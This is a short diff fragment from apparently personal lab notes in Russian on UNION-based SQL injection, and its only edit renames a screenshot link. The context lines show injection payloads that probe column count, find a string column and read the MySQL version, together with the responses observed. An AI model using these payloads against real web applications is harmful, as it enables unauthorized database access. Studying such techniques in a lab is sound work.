@@ -12,7 +12,7 @@
 'union+select+null,null+--+  200
 
 'union+select+'fff333',null+--+  первый строковый!
-![[Снимок экрана 2026-01-18 в 20.07.37.png]]
+![[Снимок-20.07.37.png]]
 
 
 'union+select+@@version,null+--+   ответ   8.0.42-0ubuntu0.20.04.1
